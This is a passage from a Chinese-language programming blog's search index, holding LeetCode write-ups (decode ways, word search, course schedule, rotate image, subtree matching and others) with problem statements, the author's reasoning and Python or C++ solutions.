in nums: n,tmp = n+1, tmp+1 ret = max(ret,tmp) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-128-longest-consecutive-sequence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e令人回想到\u003ca href=\"/2021/07/leetcode-73\"\u003e73\u003c/a\u003e\n如果找不到範圍就先看看怎麼定義頭吧\u003c/p\u003e","title":"leetcode-128 - Longest Consecutive Sequence"},{"content":"動機 有backtrack的味道，但因為要往前看一格就變成dp\nProblem A message containing letters from A-Z can be encoded into numbers using the following mapping:\n'A' -\u003e 1'B' -\u003e 2...'Z' -\u003e 26To decode an encoded message, all the digits must be grouped then mapped back into letters using the reverse of the mapping above (there may be multiple ways). For example, 11106 can be mapped into:\nAAJF with the grouping (1 1 10 6)KJF with the grouping (11 10 6)Note that the grouping (1 11 06) is invalid because 06 cannot be mapped into 'F' since 6 is different from 06.\nGiven a string s containing only digits, return the number of ways to decode it.\nThe answer is guaranteed to fit in a 32-bit integer.\nExample 1:\nInput: s = 12Output: 2Explanation: 12 could be decoded as AB (1 2) or L (12).Example 2:\nInput: s = 226Output: 3Explanation: 226 could be decoded as BZ (2 26), VF (22 6), or BBF (2 2 6).Example 3:\nInput: s = 0Output: 0Explanation: There is no character that is mapped to a number starting with 0.The only valid mappings with 0 are 'J' -\u003e 10 and 'T' -\u003e 20, neither of which start with 0.Hence, there are no valid ways to decode this since all digits need to be mapped.Example 4:\nInput: s = 06Output: 0Explanation: 06 cannot be mapped to F because of the leading zero (6 is different from 06). Constraints:\n1 \u003c= s.length \u003c= 100s contains only digits and may contain leading zero(s). Sol 定義dfs(i)是以i為終點的組合數 但我們還需要一個狀態來看前面的數字有沒有被其他2位數用過\nclass Solution: def numDecodings(self, s: str) -\u0026gt; int: @cache def dfs(i,prev): if i \u0026gt;= len(s): return 1 else: ret = dfs(i+1,True) if 1 \u0026lt;= int(s[i]) \u0026lt; 10 else 0 if prev and i-1 \u0026gt;= 0 and 10 \u0026lt;= int(s[i-1:i+1]) \u0026lt;= 26: ret += dfs(i+1,False) return ret return dfs(0,False) ","permalink":"https://littlebees.github.io/2021/07/leetcode-91-decode-ways/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有backtrack的味道，但因為要往前看一格就變成dp\u003c/p\u003e","title":"leetcode-91 - Decode Ways"},{"content":"動機 複習dfs\n這次寫dfs的教訓\n把會回傳true的放前面 (像是[[\u0026quot;a\u0026quot;]])，不然明明已經成功卻因為邊界檢查而失敗 把所有失敗條件放到base case中，在寫的時候不知道是頭撞到了還是怎樣，明明沒有比對到字卻還是讓dfs繼續跑\u0026hellip; Problem Given an m x n grid of characters board and a string word, return true if word exists in the grid.\nThe word can be constructed from letters of sequentially adjacent cells, where adjacent cells are horizontally or vertically neighboring. The same letter cell may not be used more than once.\nExample 1:\nInput: board = [[A,B,C,E],[S,F,C,S],[A,D,E,E]], word = ABCCEDOutput: trueExample 2:\nInput: board = [[A,B,C,E],[S,F,C,S],[A,D,E,E]], word = SEEOutput: trueExample 3:\nInput: board = [[A,B,C,E],[S,F,C,S],[A,D,E,E]], word = ABCBOutput: false Constraints:\nm == board.lengthn = board[i].length1 \u003c= m, n \u003c= 61 \u003c= word.length \u003c= 15board and word consists of only lowercase and uppercase English letters. Follow up: Could you use search pruning to make your solution faster with a larger board?\nSol class Solution: def exist(self, board: List[List[str]], word: str) -\u0026gt; bool: vis = [[False for _ in x] for x in board] def dfs(w,k,i,j): if len(w) == k: return True elif i \u0026lt; 0 or j \u0026lt; 0 or j \u0026gt;= len(board[0]) or i \u0026gt;= len(board) or vis[i][j] or board[i][j] != w[k]: return False else: vis[i][j] = True ret = any([dfs(w,k+1,i+1,j),dfs(w,k+1,i,j+1),dfs(w,k+1,i-1,j),dfs(w,k+1,i,j-1)]) vis[i][j] = False return ret for i in range(len(board)): for j in range(len(board[0])): if dfs(word,0,i,j): return True return False ","permalink":"https://littlebees.github.io/2021/07/leetcode-79-word-search/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs\u003c/p\u003e\n\u003cp\u003e這次寫dfs的教訓\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e把會回傳true的放前面 (像是\u003ccode\u003e[[\u0026quot;a\u0026quot;]]\u003c/code\u003e)，不然明明已經成功卻因為邊界檢查而失敗\u003c/li\u003e\n\u003cli\u003e把所有失敗條件放到base case中，在寫的時候不知道是頭撞到了還是怎樣，明明沒有比對到字卻還是讓dfs繼續跑\u0026hellip;\u003c/li\u003e\n\u003c/ol\u003e","title":"leetcode-79 - Word Search"},{"content":"動機 複習dfs 話說原來有擋修是這麼麻煩的事\nProblem There are a total of numCourses courses you have to take, labeled from 0 to numCourses - 1. You are given an array prerequisites where prerequisites[i] = [ai, bi] indicates that you must take course bi first if you want to take course ai.\nFor example, the pair [0, 1], indicates that to take course 0 you have to first take course 1.Return true if you can finish all courses. Otherwise, return false.\nExample 1:\nInput: numCourses = 2, prerequisites = [[1,0]]Output: trueExplanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0. So it is possible.Example 2:\nInput: numCourses = 2, prerequisites = [[1,0],[0,1]]Output: falseExplanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0, and to take course 0 you should also have finished course 1. So it is impossible. Constraints:\n1 \u003c= numCourses \u003c= 1050 \u003c= prerequisites.length \u003c= 5000prerequisites[i].length == 20 \u003c= ai, bi \u003c numCoursesAll the pairs prerequisites[i] are unique. Sol 區分每堂課為\nok可以上 check中 還沒check 之後去走，如果遇到check中的就是出事\nclass Solution: def canFinish(self, cnt: int, pres: List[List[int]]) -\u0026gt; bool: def cache_computing(f,is_computing=None): mem = {} @functools.wraps(f) def wrapper(*args,**kwds): if args not in mem: mem[args] = is_computing mem[args] = f(*args,**kwds) return mem[args] return wrapper premises = defaultdict(list) # class, [premises] [premises[c].append(p) for (p,c) in pres] nofrees = tuple(premises.keys()) frees = set(range(cnt)) - set(nofrees) @cache_computing def cycle(i): if i in frees: return False else: return any([((cycle(c) is None) or cycle(c)) for c in premises[i]]) return not any([cycle(c) for c in nofrees]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-207-course-schedule/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs\n話說原來有擋修是這麼麻煩的事\u003c/p\u003e","title":"leetcode-207 - Course Schedule"},{"content":"動機 以為要用bsearch\u0026hellip; 結果是搞混了\u0026hellip;\nProblem Given an array nums containing n distinct numbers in the range [0, n], return the only number in the range that is missing from the array.\nFollow up: Could you implement a solution using only O(1) extra space complexity and O(n) runtime complexity?\nExample 1:\nInput: nums = [3,0,1]Output: 2Explanation: n = 3 since there are 3 numbers, so all numbers are in the range [0,3]. 2 is the missing number in the range since it does not appear in nums.Example 2:\nInput: nums = [0,1]Output: 2Explanation: n = 2 since there are 2 numbers, so all numbers are in the range [0,2]. 2 is the missing number in the range since it does not appear in nums.Example 3:\nInput: nums = [9,6,4,2,3,5,7,0,1]Output: 8Explanation: n = 9 since there are 9 numbers, so all numbers are in the range [0,9]. 8 is the missing number in the range since it does not appear in nums.Example 4:\nInput: nums = [0]Output: 1Explanation: n = 1 since there is 1 number, so all numbers are in the range [0,1]. 1 is the missing number in the range since it does not appear in nums. Constraints:\nn == nums.length1 \u003c= n \u003c= 1040 \u003c= nums[i] \u003c= nAll the numbers of nums are unique. Sol array的數字不會重複，範圍是0~n其中n是長度 所以是0~n少一個數字，那直接用總和去減就好\nclass Solution: def missingNumber(self, n: List[int]) -\u0026gt; int: return (len(n)*(len(n)+1)//2)-sum(n) ","permalink":"https://littlebees.github.io/2021/07/leetcode-268-missing-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e以為要用bsearch\u0026hellip;\n結果是搞混了\u0026hellip;\u003c/p\u003e","title":"leetcode-268 - Missing Number"},{"content":"動機 複習Counter\nProblem Given two strings s and t, return true if t is an anagram of s, and false otherwise.\nExample 1:\nInput: s = anagram, t = nagaramOutput: trueExample 2:\nInput: s = rat, t = carOutput: false Constraints:\n1 \u003c= s.length, t.length \u003c= 5 * 104s and t consist of lowercase English letters. Follow up: What if the inputs contain Unicode characters? How would you adapt your solution to such a case?\nSol Counter看一不一樣\nclass Solution: def isAnagram(self, s: str, t: str) -\u0026gt; bool: return Counter(s) == Counter(t) ","permalink":"https://littlebees.github.io/2021/07/leetcode-242-valid-anagram/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習Counter\u003c/p\u003e","title":"leetcode-242 - Valid Anagram"},{"content":"動機 由左到右與由右到左去組合!!\nProblem Given an integer array nums, return an array answer such that answer[i] is equal to the product of all the elements of nums except nums[i].\nThe product of any prefix or suffix of nums is guaranteed to fit in a 32-bit integer.\nYou must write an algorithm that runs in O(n) time and without using the division operation.\nExample 1:\nInput: nums = [1,2,3,4]Output: [24,12,8,6]Example 2:\nInput: nums = [-1,1,0,-3,3]Output: [0,0,9,0,0] Constraints:\n2 \u003c= nums.length \u003c= 105-30 \u003c= nums[i] \u003c= 30The product of any prefix or suffix of nums is guaranteed to fit in a 32-bit integer. Follow up: Can you solve the problem in O(1) extra space complexity? (The output array does not count as extra space for space complexity analysis.)\nSol 由左到右與由右到左，之後兩個放在一起看，再看我們的目標，就會知道怎麼走了\n話說follow-up有說用常量記憶體來做，其實就是把下面的ret用成l2r就好\nclass Solution: def productExceptSelf(self, nums: List[int]) -\u0026gt; List[int]: l2r = [nums[0]] for i in range(1,len(nums)): l2r.append(l2r[i-1]*nums[i]) for i in range(len(nums)-2,0,-1): nums[i] = nums[i+1]*nums[i] r2l = nums # 1 1,2 1,2,3 1,2,3,4 # 1,2,3,4 2,3,4 3,4 4 # 2,3,4 1,3,4 1,2,4 1,2,3 ret = [r2l[1]] for i in range(len(nums)-2): ret.append(l2r[i]*r2l[i+2]) ret.append(l2r[-2]) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-238-product-of-array-except-self/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e由左到右與由右到左去組合!!\u003c/p\u003e","title":"leetcode-238 - Product of Array Except Self"},{"content":"動機 當初是自幹加法器與2補數\u0026hellip; 該學會用bit operation了，這操作太神啦!!\nProblem Given two integers a and b, return the sum of the two integers without using the operators + and -.\nExample 1:\nInput: a = 1, b = 2Output: 3Example 2:\nInput: a = 2, b = 3Output: 5 Constraints:\n-1000 \u003c= a, b \u003c= 1000 2的補數 就是讓 n + ?? = 0 0與n的binary都是確定的，那麼??的binary是多少?\n先退一步，如果加總的結果會把每個位元都轉成1的話，這樣我們以此再加1是不是就是0了!!\n0001 + 1111 = (1)0000 所以??是n的not加1，有辦法用算數的方式得到補數嗎?\n如果把10000減掉0001就是-1， 所以把2^(bits+1)-val就是補數\n正數的最大值(最小的負數)在哪? ?? + ?? = (1)0000 ??等於1000，也就是2^bits-1\n所以如果遇到大於等於2^bits-1的數字要轉成負數，val-2^bits\nSol def twos_complement(val, nbits): \u0026#34;\u0026#34;\u0026#34;Compute the 2\u0026#39;s complement of int value val\u0026#34;\u0026#34;\u0026#34; if val \u0026lt; 0: val = (1 \u0026lt;\u0026lt; nbits) + val else: if (val \u0026amp; (1 \u0026lt;\u0026lt; (nbits - 1))) != 0: # If sign bit is set. # compute negative value. val = val - (1 \u0026lt;\u0026lt; nbits) return val def adder(a,b): a = int(a) b = int(b) return [a ^ b, a \u0026amp; b] class Solution: def getSum(self, a: int, b: int) -\u0026gt; int: a = twos_complement(a,33) b = twos_complement(b,33) #print(format(a,\u0026#39;b\u0026#39;).zfill(33),format(b,\u0026#39;b\u0026#39;).zfill(33)) a = iter(reversed(list(format(a,\u0026#39;b\u0026#39;).zfill(33)))) b = iter(reversed(list(format(b,\u0026#39;b\u0026#39;).zfill(33)))) c = [] carry = 0 for _ in range(33): aa = next(a) bb = next(b) tmp, cc1 = adder(aa,bb) s, cc2 = adder(tmp, carry) carry = cc1 | cc2 c.append(s) c.reverse() #print(c) c = \u0026#39;\u0026#39;.join(str(tmp) for tmp in c) #print(c) c = twos_complement(int(c,2),33) return c Case Study 1與1相會要進位，用and加左移來模擬 01,01都會變成1，00,11都要變成0，這就只能是xor了\n所以就是上面的步驟反覆做直到沒有可以進位的數為止，太神啦!!!\nclass Solution(object): def getSum(self, a, b): # 32 bits integer max MAX = 0x7FFFFFFF # 32 bits interger min MIN = 0x80000000 # mask to get last 32 bits mask = 0xFFFFFFFF while b != 0: # ^ get different bits and \u0026amp; gets double 1s, \u0026lt;\u0026lt; moves carry a, b = (a ^ b) \u0026amp; mask, ((a \u0026amp; b) \u0026lt;\u0026lt; 1) \u0026amp; mask return a if a \u0026lt;= MAX else ~(a ^ mask) ","permalink":"https://littlebees.github.io/2021/07/leetcode-371-sum-of-two-integers/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當初是自幹加法器與2補數\u0026hellip;\n該學會用bit operation了，這操作太神啦!!\u003c/p\u003e","title":"leetcode-371 - Sum of Two Integers"},{"content":"動機 讓題我想起多allocate一塊記憶體去當dummy的手法 但是這裡不用多allocate，而是利用matrix的第一列與第一排\n而如果第一列與第一排原本就該被處理的話，就用變數存狀態!!\n這裡的教訓是狀態與被處理的資料勢必要分開，就像loop會看cond會不會收斂，有關的index會不會收斂，遞迴的變數會不會往base case靠近，是設計時的規則!!\nProblem Given an m x n integer matrix matrix, if an element is 0, set its entire row and column to 0's, and return the matrix.\nYou must do it in place.\nExample 1:\nInput: matrix = [[1,1,1],[1,0,1],[1,1,1]]Output: [[1,0,1],[0,0,0],[1,0,1]]Example 2:\nInput: matrix = [[0,1,2,0],[3,4,5,2],[1,3,1,5]]Output: [[0,0,0,0],[0,4,5,0],[0,3,1,0]] Constraints:\nm == matrix.lengthn == matrix[0].length1 \u003c= m, n \u003c= 200-231 \u003c= matrix[i][j] \u003c= 231 - 1 Follow up:\nA straightforward solution using O(mn) space is probably a bad idea.A simple improvement uses O(m + n) space, but still not the best solution.Could you devise a constant space solution? Sol 如果不追求記憶體用量的話，其實記下所有有0的點就好\n如果不想用其他記憶體，就要有地方放mark，區分這是原本的0還是後面加的，所以在python之類的語言可以用None之類的去區分\n但像c之類的就沒辦法，這時需要別的方法 可以把第一列與第一排當成checklist，這樣就沒問題了\n但要記得處理原本第一列與第一排就有0的case\nclass Solution: def setZeroes(self, ms: List[List[int]]) -\u0026gt; None: Col1,Row1 = False, False for i in range(len(ms)): if ms[i][0] == 0: Col1 = True for j in range(len(ms[0])): if ms[0][j] == 0: Row1 = True for i in range(1,len(ms)): for j in range(1,len(ms[0])): if ms[i][j] == 0: ms[i][0] = ms[0][j] = 0 for i in range(1,len(ms)): if ms[i][0] == 0: for j in range(1,len(ms[0])): ms[i][j] = 0 for j in range(1,len(ms[0])): if ms[0][j] == 0: for i in range(1,len(ms)): ms[i][j] = 0 if Col1: for i in range(len(ms)): ms[i][0] = 0 if Row1: for j in range(len(ms[0])): ms[0][j] = 0 ","permalink":"https://littlebees.github.io/2021/07/leetcode-73-set-matrix-zeroes/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e讓題我想起多allocate一塊記憶體去當dummy的手法\n但是這裡不用多allocate，而是利用matrix的第一列與第一排\u003c/p\u003e\n\u003cp\u003e而如果第一列與第一排原本就該被處理的話，就用變數存狀態!!\u003c/p\u003e\n\u003cp\u003e這裡的教訓是\u003cem\u003e狀態與被處理的資料勢必要分開\u003c/em\u003e，就像loop會看cond會不會收斂，有關的index會不會收斂，遞迴的變數會不會往base case靠近，是設計時的規則!!\u003c/p\u003e","title":"leetcode-73 - Set Matrix Zeroes"},{"content":"動機 善用binary search tree，所以才是easy\nProblem Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST.\nAccording to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes p and q as the lowest node in T that has both p and q as descendants (where we allow a node to be a descendant of itself).”\nExample 1:\nInput: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8Output: 6Explanation: The LCA of nodes 2 and 8 is 6.Example 2:\nInput: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4Output: 2Explanation: The LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.Example 3:\nInput: root = [2,1], p = 2, q = 1Output: 2 Constraints:\nThe number of nodes in the tree is in the range [2, 105].-109 \u003c= Node.val \u003c= 109All Node.val are unique.p != qp and q will exist in the BST. Sol p,q其實就是範圍，所以就照BTS的方式去找就好\nclass Solution: def lowestCommonAncestor(self, root: \u0026#39;TreeNode\u0026#39;, p: \u0026#39;TreeNode\u0026#39;, q: \u0026#39;TreeNode\u0026#39;) -\u0026gt; \u0026#39;TreeNode\u0026#39;: if p.val \u0026gt; q.val: return self.lowestCommonAncestor(root,q,p) if not root: return None elif p.val \u0026lt;= root.val \u0026lt;= q.val: return root elif q.val \u0026lt; root.val: return self.lowestCommonAncestor(root.left,p,q) else: return self.lowestCommonAncestor(root.right,p,q) ","permalink":"https://littlebees.github.io/2021/07/leetcode-235-lowest-common-ancestor-of-a-binary-search-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e善用binary search tree，所以才是easy\u003c/p\u003e","title":"leetcode-235 - Lowest Common Ancestor of a Binary Search Tree"},{"content":"動機 十分有趣\nProblem A path in a binary tree is a sequence of nodes where each pair of adjacent nodes in the sequence has an edge connecting them. A node can only appear in the sequence at most once. Note that the path does not need to pass through the root.\nThe path sum of a path is the sum of the node's values in the path.\nGiven the root of a binary tree, return the maximum path sum of any path.\nExample 1:\nInput: root = [1,2,3]Output: 6Explanation: The optimal path is 2 -\u003e 1 -\u003e 3 with a path sum of 2 + 1 + 3 = 6.Example 2:\nInput: root = [-10,9,20,null,null,15,7]Output: 42Explanation: The optimal path is 15 -\u003e 20 -\u003e 7 with a path sum of 15 + 20 + 7 = 42. Constraints:\nThe number of nodes in the tree is in the range [1, 3 * 104].-1000 \u003c= Node.val \u003c= 1000 Sol 總和有\n只有左邊 只有右邊 只有根結點 左邊+根結點 右邊+根結點 左邊+右邊+根結點 如果父節點也想加上去只有3~5的可以把父節點的值也加上去 所以分成兩個回傳值\ndef dfs(root): if not root: return [float(\u0026#39;-inf\u0026#39;), float(\u0026#39;-inf\u0026#39;)] else: gLeft, lLeft = dfs(root.left) gRight, lRight = dfs(root.right) now_connectable = max(root.val, root.val+lLeft, root.val+lRight) now_global = max(root.val+lLeft+lRight, gLeft, gRight, now_connectable) return [now_global, now_connectable] class Solution: def maxPathSum(self, root: TreeNode) -\u0026gt; int: return dfs(root)[0] ","permalink":"https://littlebees.github.io/2021/07/leetcode-124-binary-tree-maximum-path-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e十分有趣\u003c/p\u003e","title":"leetcode-124 - Binary Tree Maximum Path Sum"},{"content":"動機 評語同48\nProblem Given an m x n matrix, return all elements of the matrix in spiral order.\nExample 1:\nInput: matrix = [[1,2,3],[4,5,6],[7,8,9]]Output: [1,2,3,6,9,8,7,4,5]Example 2:\nInput: matrix = [[1,2,3,4],[5,6,7,8],[9,10,11,12]]Output: [1,2,3,4,8,12,11,10,9,5,6,7] Constraints:\nm == matrix.lengthn == matrix[i].length1 \u003c= m, n \u003c= 10-100 \u003c= matrix[i][j] \u003c= 100 Sol 處理matrix的走訪，要先確定\n怎樣才算走一圈 每一圈的長度是多少，怎麼算出來 每一圈的起點是多少 分兩邊右上與左下，之後就是依照長度去塞\nclass Solution: def spiralOrder(self, ms: List[List[int]]) -\u0026gt; List[int]: a,b,ret = len(ms), len(ms[0]), [] for i in range((min(a,b)+1)//2): ret.append(ms[i][i]) for j in range(i+1,i+b): ret.append(ms[i][j]) for ii in range(i+1,i+a): ret.append(ms[ii][i+b-1]) if a \u0026gt; 1 and b \u0026gt; 1: for j in reversed(range(i,i+b-1)): ret.append(ms[i+a-1][j]) for ii in reversed(range(i+1,i+a-1)): ret.append(ms[ii][i]) a,b = a-2, b-2 return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-54-spiral-matrix/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e評語同\u003ca href=\"/2021/07/leetcode-48\"\u003e48\u003c/a\u003e\u003c/p\u003e","title":"leetcode-54 - Spiral Matrix"},{"content":"動機 很有因緣的一題\n當初自己有解出來，不過那個index的方式十分可怕，加上自己本來就不喜歡index的題目(很多時候都是考細不細心而已，想法很簡單，但是實作細節很多) 所以解完就放著了\n結果某次offsite就遇到了，同時OJ的網站還十分爛，用stdout當作解答輸出!? 都什麼年代了!? debug的輸出與解答的輸出混在一起，十分痛苦\n同時那個OJ還要裝browser plugin，來錄音與錄影!!?? 還讓我的mac一直叫!!\n因此超不喜歡這種題目，讓人感覺回到高中或是大一 得不到演算法設計有關的啟發，就是比細心的題目 但就是有人offsite會放這種題目\u0026hellip;\n所以就重新解一次吧，把當時的錯愕了結於此\n同時對於所有rotate的題目都用reverse去做就好，不然很痛苦\nProblem You are given an n x n 2D matrix representing an image, rotate the image by 90 degrees (clockwise).\nYou have to rotate the image in-place, which means you have to modify the input 2D matrix directly. DO NOT allocate another 2D matrix and do the rotation.\nExample 1:\nInput: matrix = [[1,2,3],[4,5,6],[7,8,9]]Output: [[7,4,1],[8,5,2],[9,6,3]]Example 2:\nInput: matrix = [[5,1,9,11],[2,4,8,10],[13,3,6,7],[15,14,12,16]]Output: [[15,13,2,5],[14,3,4,1],[12,6,8,9],[16,7,10,11]]Example 3:\nInput: matrix = [[1]]Output: [[1]]Example 4:\nInput: matrix = [[1,2],[3,4]]Output: [[3,1],[4,2]] Constraints:\nmatrix.length == nmatrix[i].length == n1 \u003c= n \u003c= 20-1000 \u003c= matrix[i][j] \u003c= 1000 Sol 長度帶3，來推推看怎麼設定\n從大的走法到小的走法\n大的走法: 一圈一圈由外往內，直到中心點 for i in range((len(ms)+1)//2): n = len(ms)-i*2-1+i # end of range # (0,0) -\u0026gt; (1,1) # .... 小的走法: 把4個點轉一圈 # (0,0) -\u0026gt; (0,2) -\u0026gt; (2,2) -\u0026gt; (2,0) # (0,1) -\u0026gt; (1,2) -\u0026gt; (2,1) -\u0026gt; (1,0) # (0,+1) (+1,0) (0,-1) (-1,0) # 用把0設定成i, 2設定成n # (i,i) -\u0026gt; (i,n) -\u0026gt; (n,n) -\u0026gt; (n,i) # (i,i+1) -\u0026gt; (i+1,n) -\u0026gt; (n,n-1) -\u0026gt; (n-1,i) # 把遞增量設定成a tmp = ms[i][i+a] ms[i][i+a] = ms[n-a][i] ms[n-a][i] = ms[n][n-a] ms[n][n-a] = ms[i+a][n] ms[i+a][n] = tmp 小的走法要走幾次: n-i次 (目前處理範圍的總長-1次，最後一個不用轉，n與i都是index所以直接相減就是總長-1) 四個四個轉，這種座標就只能用推的\nclass Solution: def rotate(self, ms: List[List[int]]) -\u0026gt; None: n,a,b,prev = len(ms),0,0,ms[0][0] # (a,b) is the starting point of each ring while n \u0026gt; 0: for k in range(n-1): # 0,0 : 0,n-1 : n-1,n-1 : n-1,0 # 0,1 : 1,n-1 : n-1,n-1-1 : n-1-1, 0 ms[a][b+k], ms[a+k][b+n-1], ms[a+n-1][b+n-1-k], ms[a+n-1-k][b] = ms[a+n-1-k][b], ms[a][b+k], ms[a+k][b+n-1], ms[a+n-1][b+n-1-k] a, b = a+1, b+1 n -= 2 case study 用對角線(1,5,9)去swap對面的值，之後每個row做reverse\n1 2 3　1 4 7　7 4 1 4 5 6　--\u0026gt;　2 5 8　--\u0026gt; 8 5 2　7 8 9 3 6 9　9 6 3 class Solution { public: void rotate(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; mx) { for(int i=0;i\u0026lt;mx.size();i++) { for(int j=i+1;j\u0026lt;mx.size();j++) { swap(mx[i][j],mx[j][i]); } reverse(mx[i].begin(),mx[i].end()); } } }; ","permalink":"https://littlebees.github.io/2021/07/leetcode-48-rotate-image/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e很有因緣的一題\u003c/p\u003e\n\u003cp\u003e當初自己有解出來，不過那個index的方式十分可怕，加上自己本來就不喜歡index的題目(很多時候都是考細不細心而已，想法很簡單，但是實作細節很多)\n所以解完就放著了\u003c/p\u003e\n\u003cp\u003e結果某次offsite就遇到了，同時OJ的網站還十分爛，用stdout當作解答輸出!?\n都什麼年代了!?\ndebug的輸出與解答的輸出混在一起，十分痛苦\u003c/p\u003e\n\u003cp\u003e同時那個OJ還要裝browser plugin，來錄音與錄影!!??\n還讓我的mac一直叫!!\u003c/p\u003e\n\u003cp\u003e因此超不喜歡這種題目，讓人感覺回到高中或是大一\n得不到演算法設計有關的啟發，就是比細心的題目\n但就是有人offsite會放這種題目\u0026hellip;\u003c/p\u003e\n\u003cp\u003e所以就重新解一次吧，把當時的錯愕了結於此\u003c/p\u003e\n\u003cp\u003e同時對於所有rotate的題目都用reverse去做就好，不然很痛苦\u003c/p\u003e","title":"leetcode-48 - Rotate Image"},{"content":"動機 老實地分成兩個dfs\nProblem Given the roots of two binary trees root and subRoot, return true if there is a subtree of root with the same structure and node values of subRoot and false otherwise.\nA subtree of a binary tree tree is a tree that consists of a node in tree and all of this node's descendants. The tree tree could also be considered as a subtree of itself.\nExample 1:\nInput: root = [3,4,5,1,2], subRoot = [4,1,2]Output: trueExample 2:\nInput: root = [3,4,5,1,2,null,null,null,null,0], subRoot = [4,1,2]Output: false Constraints:\nThe number of nodes in the root tree is in the range [1, 2000].The number of nodes in the subRoot tree is in the range [1, 1000].-104 \u003c= root.val \u003c= 104-104 \u003c= subRoot.val \u003c= 104 Sol: WA 一開始想著把\n比對 走訪 一起做完，最後就悲劇了，比對要一次比對完，不然比對的對象會被拆掉，像\n[3,4,5,1,null,2] [3,1,2] class Solution: def isSubtree(self, s: TreeNode, t: TreeNode) -\u0026gt; bool: if not t and not s: return True elif not t or not s: return False else: ret = self.isSubtree(s.left,t) or self.isSubtree(s.right,t) if s.val == t.val: ret = ret or self.isSubtree(s.left,t.left) and self.isSubtree(s.right,t.right) return ret Sol class Solution: def equal(self,s,t): if not t and not s: return True elif not t or not s: return False else: return s.val == t.val and self.equal(s.left,t.left) and self.equal(s.right,t.right) def f(self,s,t): if not s: return False else: return self.equal(s,t) or self.f(s.left,t) or self.f(s.right,t) def isSubtree(self, s: TreeNode, t: TreeNode) -\u0026gt; bool: return self.f(s,t) Sol: preorder 走preorder找substring，不過要注意像\n[12,1] [2,1] 這種，要加個符號區分點與點\nclass Solution: # dont integrate two recursion into one def pre(self,s,t): if not s: t.append(\u0026#39;y\u0026#39;) return t else: t.append(\u0026#34;x\u0026#34;+str(s.val)) return self.pre(s.right,self.pre(s.left,t)) def isSubtree(self, s: TreeNode, t: TreeNode) -\u0026gt; bool: s = self.pre(s,[]) t = self.pre(t,[]) print(s,t) s = \u0026#39;,\u0026#39;.join(s) t = \u0026#39;,\u0026#39;.join(t) print(s,\u0026#34;::\u0026#34;,t) return t in s ","permalink":"https://littlebees.github.io/2021/07/leetcode-572-subtree-of-another-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e老實地分成兩個dfs\u003c/p\u003e","title":"leetcode-572 - Subtree of Another Tree"},{"content":"動機 對ㄟ，可以先拉一個範圍去走，有點像求中點\nProblem Given the head of a linked list, remove the nth node from the end of the list and return its head.\nExample 1:\nInput: head = [1,2,3,4,5], n = 2Output: [1,2,3,5]Example 2:\nInput: head = [1], n = 1Output: []Example 3:\nInput: head = [1,2], n = 1Output: [1] Constraints:\nThe number of nodes in the list is sz.1 \u003c= sz \u003c= 300 \u003c= Node.val \u003c= 1001 \u003c= n \u003c= sz Follow up: Could you do this in one pass?\nSol 可以用遞迴的後半段來刪node\ndef main(prev,head,n): if not head: return [head,n-1] else: prev_head, n = main(head, head.next, n) if n == 0: if prev: prev.next = head.next return [prev, -1] else: return [head.next, -1] else: return [head, n-1] class Solution: def removeNthFromEnd(self, head: ListNode, n: int) -\u0026gt; ListNode: head, n = main(None, head, n) return head 或者，先把距離拉出來 讓終點ptr與要刪的點先保持需要的距離\n之後讓終點ptr走到底，再刪\nclass Solution: def removeNthFromEnd(self, head: ListNode, n: int) -\u0026gt; ListNode: prev, now, end = None, head, head for _ in range(n): end = end.next while end: prev, now, end = now, now.next, end.next if prev: prev.next, ret = now.next, head else: ret = now.next return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-19-remove-nth-node-from-end-of-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e對ㄟ，可以先拉一個範圍去走，有點像求中點\u003c/p\u003e","title":"leetcode-19 - Remove Nth Node From End of List"},{"content":"動機 複習dfs\nProblem Given a reference of a node in a connected undirected graph.\nReturn a deep copy (clone) of the graph.\nEach node in the graph contains a value (int) and a list (List[Node]) of its neighbors.\nclass Node { public int val; public List neighbors;} Test case format:\nFor simplicity, each node's value is the same as the node's index (1-indexed). For example, the first node with val == 1, the second node with val == 2, and so on. The graph is represented in the test case using an adjacency list.\nAn adjacency list is a collection of unordered lists used to represent a finite graph. Each list describes the set of neighbors of a node in the graph.\nThe given node will always be the first node with val = 1. You must return the copy of the given node as a reference to the cloned graph.\nExample 1:\nInput: adjList = [[2,4],[1,3],[2,4],[1,3]]Output: [[2,4],[1,3],[2,4],[1,3]]Explanation: There are 4 nodes in the graph.1st node 